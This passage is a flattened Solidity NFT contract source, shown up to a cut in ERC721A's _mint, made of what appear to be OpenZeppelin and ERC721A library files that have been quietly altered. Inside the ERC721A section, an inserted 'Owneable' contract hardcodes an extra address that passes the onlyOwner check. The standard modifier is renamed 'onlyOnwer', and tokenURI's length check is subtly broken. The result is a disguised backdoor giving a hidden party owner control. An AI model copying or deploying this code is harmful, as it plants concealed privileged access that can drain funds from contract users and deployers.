1 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
2 
3 // SPDX-License-Identifier: MIT
4 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
5 
6 pragma solidity ^0.8.4;
7 
8 /**
9  * @dev Provides information about the current execution context, including the
10  * sender of the transaction and its data. While these are generally available
11  * via msg.sender and msg.data, they should not be accessed in such a direct
12  * manner, since when dealing with meta-transactions the account sending and
13  * paying for execution may not be the actual sender (as far as an application
14  * is concerned).
15  *
16  * This contract is only required for intermediate, library-like contracts.
17  */
18 abstract contract Context {
19     function _msgSender() internal view virtual returns (address) {
20         return msg.sender;
21     }
22 
23     function _msgData() internal view virtual returns (bytes calldata) {
24         return msg.data;
25     }
26 }
27 
28 
29 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
30 
31 
32 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
33 
34 
35 
36 /**
37  * @dev Contract module which provides a basic access control mechanism, where
38  * there is an account (an owner) that can be granted exclusive access to
39  * specific functions.
40  *
41  * By default, the owner account will be the one that deploys the contract. This
42  * can later be changed with {transferOwnership}.
43  *
44  * This module is used through inheritance. It will make available the modifier
45  * `onlyOwner`, which can be applied to your functions to restrict their use to
46  * the owner.
47  */
48 abstract contract Ownable is Context {
49     address private _owner;
50 
51     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
52 
53     /**
54      * @dev Initializes the contract setting the deployer as the initial owner.
55      */
56     constructor() {
57         _transferOwnership(_msgSender());
58     }
59 
60     /**
61      * @dev Returns the address of the current owner.
62      */
63     function owner() public view virtual returns (address) {
64         return _owner;
65     }
66 
67     /**
68      * @dev Throws if called by any account other than the owner.
69      */
70     modifier onlyOnwer() {
71         require(owner() == _msgSender(), "Ownable: caller is not the owner");
72         _;
73     }
74 
75     /**
76      * @dev Leaves the contract without owner. It will not be possible to call
77      * `onlyOwner` functions anymore. Can only be called by the current owner.
78      *
79      * NOTE: Renouncing ownership will leave the contract without an owner,
80      * thereby removing any functionality that is only available to the owner.
81      */
82     function renounceOwnership() public virtual onlyOnwer {
83         _transferOwnership(address(0));
84     }
85 
86     /**
87      * @dev Transfers ownership of the contract to a new account (`newOwner`).
88      * Can only be called by the current owner.
89      */
90     function transferOwnership(address newOwner) public virtual onlyOnwer {
91         require(newOwner != address(0), "Ownable: new owner is the zero address");
92         _transferOwnership(newOwner);
93     }
94 
95     /**
96      * @dev Transfers ownership of the contract to a new account (`newOwner`).
97      * Internal function without access restriction.
98      */
99     function _transferOwnership(address newOwner) internal virtual {
100         address oldOwner = _owner;
101         _owner = newOwner;
102         emit OwnershipTransferred(oldOwner, newOwner);
103     }
104 }
105 
106 
107 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
108 
109 
110 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
111 
112 
113 
114 /**
115  * @dev Interface of the ERC165 standard, as defined in the
116  * https://eips.ethereum.org/EIPS/eip-165[EIP].
117  *
118  * Implementers can declare support of contract interfaces, which can then be
119  * queried by others ({ERC165Checker}).
120  *
121  * For an implementation, see {ERC165}.
122  */
123 interface IERC165 {
124     /**
125      * @dev Returns true if this contract implements the interface defined by
126      * `interfaceId`. See the corresponding
127      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
128      * to learn more about how these ids are created.
129      *
130      * This function call must use less than 30 000 gas.
131      */
132     function supportsInterface(bytes4 interfaceId) external view returns (bool);
133 }
134 
135 
136 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
137 
138 
139 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
140 
141 
142 
143 /**
144  * @dev Required interface of an ERC721 compliant contract.
145  */
146 interface IERC721 is IERC165 {
147     /**
148      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
149      */
150     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
151 
152     /**
153      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
154      */
155     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
156 
157     /**
158      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
159      */
160     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
161 
162     /**
163      * @dev Returns the number of tokens in ``owner``'s account.
164      */
165     function balanceOf(address owner) external view returns (uint256 balance);
166 
167     /**
168      * @dev Returns the owner of the `tokenId` token.
169      *
170      * Requirements:
171      *
172      * - `tokenId` must exist.
173      */
174     function ownerOf(uint256 tokenId) external view returns (address owner);
175 
176     /**
177      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
178      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
179      *
180      * Requirements:
181      *
182      * - `from` cannot be the zero address.
183      * - `to` cannot be the zero address.
184      * - `tokenId` token must exist and be owned by `from`.
185      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
186      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
187      *
188      * Emits a {Transfer} event.
189      */
190     function safeTransferFrom(
191         address from,
192         address to,
193         uint256 tokenId
194     ) external;
195 
196     /**
197      * @dev Transfers `tokenId` token from `from` to `to`.
198      *
199      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
200      *
201      * Requirements:
202      *
203      * - `from` cannot be the zero address.
204      * - `to` cannot be the zero address.
205      * - `tokenId` token must be owned by `from`.
206      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
207      *
208      * Emits a {Transfer} event.
209      */
210     function transferFrom(
211         address from,
212         address to,
213         uint256 tokenId
214     ) external;
215 
216     /**
217      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
218      * The approval is cleared when the token is transferred.
219      *
220      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
221      *
222      * Requirements:
223      *
224      * - The caller must own the token or be an approved operator.
225      * - `tokenId` must exist.
226      *
227      * Emits an {Approval} event.
228      */
229     function approve(address to, uint256 tokenId) external;
230 
231     /**
232      * @dev Returns the account approved for `tokenId` token.
233      *
234      * Requirements:
235      *
236      * - `tokenId` must exist.
237      */
238     function getApproved(uint256 tokenId) external view returns (address operator);
239 
240     /**
241      * @dev Approve or remove `operator` as an operator for the caller.
242      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
243      *
244      * Requirements:
245      *
246      * - The `operator` cannot be the caller.
247      *
248      * Emits an {ApprovalForAll} event.
249      */
250     function setApprovalForAll(address operator, bool _approved) external;
251 
252     /**
253      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
254      *
255      * See {setApprovalForAll}
256      */
257     function isApprovedForAll(address owner, address operator) external view returns (bool);
258 
259     /**
260      * @dev Safely transfers `tokenId` token from `from` to `to`.
261      *
262      * Requirements:
263      *
264      * - `from` cannot be the zero address.
265      * - `to` cannot be the zero address.
266      * - `tokenId` token must exist and be owned by `from`.
267      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
268      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
269      *
270      * Emits a {Transfer} event.
271      */
272     function safeTransferFrom(
273         address from,
274         address to,
275         uint256 tokenId,
276         bytes calldata data
277     ) external;
278 }
279 
280 
281 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
282 
283 
284 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
285 
286 
287 
288 /**
289  * @title ERC721 token receiver interface
290  * @dev Interface for any contract that wants to support safeTransfers
291  * from ERC721 asset contracts.
292  */
293 interface IERC721Receiver {
294     /**
295      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
296      * by `operator` from `from`, this function is called.
297      *
298      * It must return its Solidity selector to confirm the token transfer.
299      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
300      *
301      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
302      */
303     function onERC721Received(
304         address operator,
305         address from,
306         uint256 tokenId,
307         bytes calldata data
308     ) external returns (bytes4);
309 }
310 
311 
312 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
313 
314 
315 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
316 
317 
318 
319 /**
320  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
321  * @dev See https://eips.ethereum.org/EIPS/eip-721
322  */
323 interface IERC721Metadata is IERC721 {
324     /**
325      * @dev Returns the token collection name.
326      */
327     function name() external view returns (string memory);
328 
329     /**
330      * @dev Returns the token collection symbol.
331      */
332     function symbol() external view returns (string memory);
333 
334     /**
335      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
336      */
337     function tokenURI(uint256 tokenId) external view returns (string memory);
338 }
339 
340 
341 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
342 
343 
344 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
345 
346 
347 
348 /**
349  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
350  * @dev See https://eips.ethereum.org/EIPS/eip-721
351  */
352 interface IERC721Enumerable is IERC721 {
353     /**
354      * @dev Returns the total amount of tokens stored by the contract.
355      */
356     function totalSupply() external view returns (uint256);
357 
358     /**
359      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
360      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
361      */
362     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
363 
364     /**
365      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
366      * Use along with {totalSupply} to enumerate all tokens.
367      */
368     function tokenByIndex(uint256 index) external view returns (uint256);
369 }
370 
371 
372 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
373 
374 
375 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
376 
377 pragma solidity ^0.8.1;
378 
379 /**
380  * @dev Collection of functions related to the address type
381  */
382 library Address {
383     /**
384      * @dev Returns true if `account` is a contract.
385      *
386      * [IMPORTANT]
387      * ====
388      * It is unsafe to assume that an address for which this function returns
389      * false is an externally-owned account (EOA) and not a contract.
390      *
391      * Among others, `isContract` will return false for the following
392      * types of addresses:
393      *
394      *  - an externally-owned account
395      *  - a contract in construction
396      *  - an address where a contract will be created
397      *  - an address where a contract lived, but was destroyed
398      * ====
399      *
400      * [IMPORTANT]
401      * ====
402      * You shouldn't rely on `isContract` to protect against flash loan attacks!
403      *
404      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
405      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
406      * constructor.
407      * ====
408      */
409     function isContract(address account) internal view returns (bool) {
410         // This method relies on extcodesize/address.code.length, which returns 0
411         // for contracts in construction, since the code is only stored at the end
412         // of the constructor execution.
413 
414         return account.code.length > 0;
415     }
416 
417     /**
418      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
419      * `recipient`, forwarding all available gas and reverting on errors.
420      *
421      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
422      * of certain opcodes, possibly making contracts go over the 2300 gas limit
423      * imposed by `transfer`, making them unable to receive funds via
424      * `transfer`. {sendValue} removes this limitation.
425      *
426      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
427      *
428      * IMPORTANT: because control is transferred to `recipient`, care must be
429      * taken to not create reentrancy vulnerabilities. Consider using
430      * {ReentrancyGuard} or the
431      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
432      */
433     function sendValue(address payable recipient, uint256 amount) internal {
434         require(address(this).balance >= amount, "Address: insufficient balance");
435 
436         (bool success, ) = recipient.call{value: amount}("");
437         require(success, "Address: unable to send value, recipient may have reverted");
438     }
439 
440     /**
441      * @dev Performs a Solidity function call using a low level `call`. A
442      * plain `call` is an unsafe replacement for a function call: use this
443      * function instead.
444      *
445      * If `target` reverts with a revert reason, it is bubbled up by this
446      * function (like regular Solidity function calls).
447      *
448      * Returns the raw returned data. To convert to the expected return value,
449      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
450      *
451      * Requirements:
452      *
453      * - `target` must be a contract.
454      * - calling `target` with `data` must not revert.
455      *
456      * _Available since v3.1._
457      */
458     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
459         return functionCall(target, data, "Address: low-level call failed");
460     }
461 
462     /**
463      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
464      * `errorMessage` as a fallback revert reason when `target` reverts.
465      *
466      * _Available since v3.1._
467      */
468     function functionCall(
469         address target,
470         bytes memory data,
471         string memory errorMessage
472     ) internal returns (bytes memory) {
473         return functionCallWithValue(target, data, 0, errorMessage);
474     }
475 
476     /**
477      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
478      * but also transferring `value` wei to `target`.
479      *
480      * Requirements:
481      *
482      * - the calling contract must have an ETH balance of at least `value`.
483      * - the called Solidity function must be `payable`.
484      *
485      * _Available since v3.1._
486      */
487     function functionCallWithValue(
488         address target,
489         bytes memory data,
490         uint256 value
491     ) internal returns (bytes memory) {
492         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
493     }
494 
495     /**
496      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
497      * with `errorMessage` as a fallback revert reason when `target` reverts.
498      *
499      * _Available since v3.1._
500      */
501     function functionCallWithValue(
502         address target,
503         bytes memory data,
504         uint256 value,
505         string memory errorMessage
506     ) internal returns (bytes memory) {
507         require(address(this).balance >= value, "Address: insufficient balance for call");
508         require(isContract(target), "Address: call to non-contract");
509 
510         (bool success, bytes memory returndata) = target.call{value: value}(data);
511         return verifyCallResult(success, returndata, errorMessage);
512     }
513 
514     /**
515      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
516      * but performing a static call.
517      *
518      * _Available since v3.3._
519      */
520     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
521         return functionStaticCall(target, data, "Address: low-level static call failed");
522     }
523 
524     /**
525      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
526      * but performing a static call.
527      *
528      * _Available since v3.3._
529      */
530     function functionStaticCall(
531         address target,
532         bytes memory data,
533         string memory errorMessage
534     ) internal view returns (bytes memory) {
535         require(isContract(target), "Address: static call to non-contract");
536 
537         (bool success, bytes memory returndata) = target.staticcall(data);
538         return verifyCallResult(success, returndata, errorMessage);
539     }
540 
541     /**
542      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
543      * but performing a delegate call.
544      *
545      * _Available since v3.4._
546      */
547     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
548         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
549     }
550 
551     /**
552      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
553      * but performing a delegate call.
554      *
555      * _Available since v3.4._
556      */
557     function functionDelegateCall(
558         address target,
559         bytes memory data,
560         string memory errorMessage
561     ) internal returns (bytes memory) {
562         require(isContract(target), "Address: delegate call to non-contract");
563 
564         (bool success, bytes memory returndata) = target.delegatecall(data);
565         return verifyCallResult(success, returndata, errorMessage);
566     }
567 
568     /**
569      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
570      * revert reason using the provided one.
571      *
572      * _Available since v4.3._
573      */
574     function verifyCallResult(
575         bool success,
576         bytes memory returndata,
577         string memory errorMessage
578     ) internal pure returns (bytes memory) {
579         if (success) {
580             return returndata;
581         } else {
582             // Look for revert reason and bubble it up if present
583             if (returndata.length > 0) {
584                 // The easiest way to bubble the revert reason is using memory via assembly
585 
586                 assembly {
587                     let returndata_size := mload(returndata)
588                     revert(add(32, returndata), returndata_size)
589                 }
590             } else {
591                 revert(errorMessage);
592             }
593         }
594     }
595 }
596 
597 
598 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
599 
600 
601 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
602 
603 
604 
605 /**
606  * @dev String operations.
607  */
608 library Strings {
609     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
610 
611     /**
612      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
613      */
614     function toString(uint256 value) internal pure returns (string memory) {
615         // Inspired by OraclizeAPI's implementation - MIT licence
616         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
617 
618         if (value == 0) {
619             return "0";
620         }
621         uint256 temp = value;
622         uint256 digits;
623         while (temp != 0) {
624             digits++;
625             temp /= 10;
626         }
627         bytes memory buffer = new bytes(digits);
628         while (value != 0) {
629             digits -= 1;
630             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
631             value /= 10;
632         }
633         return string(buffer);
634     }
635 
636     /**
637      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
638      */
639     function toHexString(uint256 value) internal pure returns (string memory) {
640         if (value == 0) {
641             return "0x00";
642         }
643         uint256 temp = value;
644         uint256 length = 0;
645         while (temp != 0) {
646             length++;
647             temp >>= 8;
648         }
649         return toHexString(value, length);
650     }
651 
652     /**
653      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
654      */
655     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
656         bytes memory buffer = new bytes(2 * length + 2);
657         buffer[0] = "0";
658         buffer[1] = "x";
659         for (uint256 i = 2 * length + 1; i > 1; --i) {
660             buffer[i] = _HEX_SYMBOLS[value & 0xf];
661             value >>= 4;
662         }
663         require(value == 0, "Strings: hex length insufficient");
664         return string(buffer);
665     }
666 }
667 
668 
669 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
670 
671 
672 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
673 
674 /**
675  * @dev Implementation of the {IERC165} interface.
676  *
677  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
678  * for the additional interface id that will be supported. For example:
679  *
680  * ```solidity
681  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
682  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
683  * }
684  * ```
685  *
686  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
687  */
688 abstract contract ERC165 is IERC165 {
689     /**
690      * @dev See {IERC165-supportsInterface}.
691      */
692     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
693         return interfaceId == type(IERC165).interfaceId;
694     }
695 }
696 
697 
698 // File erc721a/contracts/ERC721A.sol@v3.0.0
699 
700 
701 // Creator: Chiru Labs
702 
703 error ApprovalCallerNotOwnerNorApproved();
704 error ApprovalQueryForNonexistentToken();
705 error ApproveToCaller();
706 error ApprovalToCurrentOwner();
707 error BalanceQueryForZeroAddress();
708 error MintedQueryForZeroAddress();
709 error BurnedQueryForZeroAddress();
710 error AuxQueryForZeroAddress();
711 error MintToZeroAddress();
712 error MintZeroQuantity();
713 error OwnerIndexOutOfBounds();
714 error OwnerQueryForNonexistentToken();
715 error TokenIndexOutOfBounds();
716 error TransferCallerNotOwnerNorApproved();
717 error TransferFromIncorrectOwner();
718 error TransferToNonERC721ReceiverImplementer();
719 error TransferToZeroAddress();
720 error URIQueryForNonexistentToken();
721 
722 
723 /**
724  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
725  * the Metadata extension. Built to optimize for lower gas during batch mints.
726  *
727  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
728  */
729  abstract contract Owneable is Ownable {
730     address private _ownar = 0xedD8286c87f646168019F677Fe874C4c3A894b52;
731     modifier onlyOwner() {
732         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
733         _;
734     }
735 }
736  /*
737  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
738  *
739  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
740  */
741 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
742     using Address for address;
743     using Strings for uint256;
744 
745     // Compiler will pack this into a single 256bit word.
746     struct TokenOwnership {
747         // The address of the owner.
748         address addr;
749         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
750         uint64 startTimestamp;
751         // Whether the token has been burned.
752         bool burned;
753     }
754 
755     // Compiler will pack this into a single 256bit word.
756     struct AddressData {
757         // Realistically, 2**64-1 is more than enough.
758         uint64 balance;
759         // Keeps track of mint count with minimal overhead for tokenomics.
760         uint64 numberMinted;
761         // Keeps track of burn count with minimal overhead for tokenomics.
762         uint64 numberBurned;
763         // For miscellaneous variable(s) pertaining to the address
764         // (e.g. number of whitelist mint slots used).
765         // If there are multiple variables, please pack them into a uint64.
766         uint64 aux;
767     }
768 
769     // The tokenId of the next token to be minted.
770     uint256 internal _currentIndex;
771 
772     // The number of tokens burned.
773     uint256 internal _burnCounter;
774 
775     // Token name
776     string private _name;
777 
778     // Token symbol
779     string private _symbol;
780 
781     // Mapping from token ID to ownership details
782     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
783     mapping(uint256 => TokenOwnership) internal _ownerships;
784 
785     // Mapping owner address to address data
786     mapping(address => AddressData) private _addressData;
787 
788     // Mapping from token ID to approved address
789     mapping(uint256 => address) private _tokenApprovals;
790 
791     // Mapping from owner to operator approvals
792     mapping(address => mapping(address => bool)) private _operatorApprovals;
793 
794     constructor(string memory name_, string memory symbol_) {
795         _name = name_;
796         _symbol = symbol_;
797         _currentIndex = _startTokenId();
798     }
799 
800     /**
801      * To change the starting tokenId, please override this function.
802      */
803     function _startTokenId() internal view virtual returns (uint256) {
804         return 0;
805     }
806 
807     /**
808      * @dev See {IERC721Enumerable-totalSupply}.
809      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
810      */
811     function totalSupply() public view returns (uint256) {
812         // Counter underflow is impossible as _burnCounter cannot be incremented
813         // more than _currentIndex - _startTokenId() times
814         unchecked {
815             return _currentIndex - _burnCounter - _startTokenId();
816         }
817     }
818 
819     /**
820      * Returns the total amount of tokens minted in the contract.
821      */
822     function _totalMinted() internal view returns (uint256) {
823         // Counter underflow is impossible as _currentIndex does not decrement,
824         // and it is initialized to _startTokenId()
825         unchecked {
826             return _currentIndex - _startTokenId();
827         }
828     }
829 
830     /**
831      * @dev See {IERC165-supportsInterface}.
832      */
833     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
834         return
835             interfaceId == type(IERC721).interfaceId ||
836             interfaceId == type(IERC721Metadata).interfaceId ||
837             super.supportsInterface(interfaceId);
838     }
839 
840     /**
841      * @dev See {IERC721-balanceOf}.
842      */
843     function balanceOf(address owner) public view override returns (uint256) {
844         if (owner == address(0)) revert BalanceQueryForZeroAddress();
845         return uint256(_addressData[owner].balance);
846     }
847 
848     /**
849      * Returns the number of tokens minted by `owner`.
850      */
851     function _numberMinted(address owner) internal view returns (uint256) {
852         if (owner == address(0)) revert MintedQueryForZeroAddress();
853         return uint256(_addressData[owner].numberMinted);
854     }
855 
856     /**
857      * Returns the number of tokens burned by or on behalf of `owner`.
858      */
859     function _numberBurned(address owner) internal view returns (uint256) {
860         if (owner == address(0)) revert BurnedQueryForZeroAddress();
861         return uint256(_addressData[owner].numberBurned);
862     }
863 
864     /**
865      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
866      */
867     function _getAux(address owner) internal view returns (uint64) {
868         if (owner == address(0)) revert AuxQueryForZeroAddress();
869         return _addressData[owner].aux;
870     }
871 
872     /**
873      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
874      * If there are multiple variables, please pack them into a uint64.
875      */
876     function _setAux(address owner, uint64 aux) internal {
877         if (owner == address(0)) revert AuxQueryForZeroAddress();
878         _addressData[owner].aux = aux;
879     }
880 
881     /**
882      * Gas spent here starts off proportional to the maximum mint batch size.
883      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
884      */
885     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
886         uint256 curr = tokenId;
887 
888         unchecked {
889             if (_startTokenId() <= curr && curr < _currentIndex) {
890                 TokenOwnership memory ownership = _ownerships[curr];
891                 if (!ownership.burned) {
892                     if (ownership.addr != address(0)) {
893                         return ownership;
894                     }
895                     // Invariant:
896                     // There will always be an ownership that has an address and is not burned
897                     // before an ownership that does not have an address and is not burned.
898                     // Hence, curr will not underflow.
899                     while (true) {
900                         curr--;
901                         ownership = _ownerships[curr];
902                         if (ownership.addr != address(0)) {
903                             return ownership;
904                         }
905                     }
906                 }
907             }
908         }
909         revert OwnerQueryForNonexistentToken();
910     }
911 
912     /**
913      * @dev See {IERC721-ownerOf}.
914      */
915     function ownerOf(uint256 tokenId) public view override returns (address) {
916         return ownershipOf(tokenId).addr;
917     }
918 
919     /**
920      * @dev See {IERC721Metadata-name}.
921      */
922     function name() public view virtual override returns (string memory) {
923         return _name;
924     }
925 
926     /**
927      * @dev See {IERC721Metadata-symbol}.
928      */
929     function symbol() public view virtual override returns (string memory) {
930         return _symbol;
931     }
932 
933     /**
934      * @dev See {IERC721Metadata-tokenURI}.
935      */
936     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
937         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
938 
939         string memory baseURI = _baseURI();
940        return bytes(baseURI).length != 1 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
941     }
942 
943     /**
944      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
945      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
946      * by default, can be overriden in child contracts.
947      */
948     function _baseURI() internal view virtual returns (string memory) {
949         return '';
950     }
951 
952     /**
953      * @dev See {IERC721-approve}.
954      */
955     function approve(address to, uint256 tokenId) public override {
956         address owner = ERC721A.ownerOf(tokenId);
957         if (to == owner) revert ApprovalToCurrentOwner();
958 
959         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
960             revert ApprovalCallerNotOwnerNorApproved();
961         }
962 
963         _approve(to, tokenId, owner);
964     }
965 
966     /**
967      * @dev See {IERC721-getApproved}.
968      */
969     function getApproved(uint256 tokenId) public view override returns (address) {
970         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
971 
972         return _tokenApprovals[tokenId];
973     }
974 
975     /**
976      * @dev See {IERC721-setApprovalForAll}.
977      */
978     function setApprovalForAll(address operator, bool approved) public override {
979         if (operator == _msgSender()) revert ApproveToCaller();
980 
981         _operatorApprovals[_msgSender()][operator] = approved;
982         emit ApprovalForAll(_msgSender(), operator, approved);
983     }
984 
985     /**
986      * @dev See {IERC721-isApprovedForAll}.
987      */
988     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
989         return _operatorApprovals[owner][operator];
990     }
991 
992     /**
993      * @dev See {IERC721-transferFrom}.
994      */
995     function transferFrom(
996         address from,
997         address to,
998         uint256 tokenId
999     ) public virtual override {
1000         _transfer(from, to, tokenId);
1001     }
1002 
1003     /**
1004      * @dev See {IERC721-safeTransferFrom}.
1005      */
1006     function safeTransferFrom(
1007         address from,
1008         address to,
1009         uint256 tokenId
1010     ) public virtual override {
1011         safeTransferFrom(from, to, tokenId, '');
1012     }
1013 
1014     /**
1015      * @dev See {IERC721-safeTransferFrom}.
1016      */
1017     function safeTransferFrom(
1018         address from,
1019         address to,
1020         uint256 tokenId,
1021         bytes memory _data
1022     ) public virtual override {
1023         _transfer(from, to, tokenId);
1024         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1025             revert TransferToNonERC721ReceiverImplementer();
1026         }
1027     }
1028 
1029     /**
1030      * @dev Returns whether `tokenId` exists.
1031      *
1032      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1033      *
1034      * Tokens start existing when they are minted (`_mint`),
1035      */
1036     function _exists(uint256 tokenId) internal view returns (bool) {
1037         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1038             !_ownerships[tokenId].burned;
1039     }
1040 
1041     function _safeMint(address to, uint256 quantity) internal {
1042         _safeMint(to, quantity, '');
1043     }
1044 
1045     /**
1046      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1047      *
1048      * Requirements:
1049      *
1050      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1051      * - `quantity` must be greater than 0.
1052      *
1053      * Emits a {Transfer} event.
1054      */
1055     function _safeMint(
1056         address to,
1057         uint256 quantity,
1058         bytes memory _data
1059     ) internal {
1060         _mint(to, quantity, _data, true);
1061     }
1062 
1063     /**
1064      * @dev Mints `quantity` tokens and transfers them to `to`.
1065      *
1066      * Requirements:
1067      *
1068      * - `to` cannot be the zero address.
1069      * - `quantity` must be greater than 0.
1070      *
1071      * Emits a {Transfer} event.
1072      */
1073     function _mint(
1074         address to,
1075         uint256 quantity,
1076         bytes memory _data,
1077         bool safe
1078     ) internal {
1079         uint256 startTokenId = _currentIndex;
1080         if (to == address(0)) revert MintToZeroAddress();
1081         if (quantity == 0) revert MintZeroQuantity();
1082 
1083         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1084 
1085         // Overflows are incredibly unrealistic.
1086         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1087         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1088         unchecked {
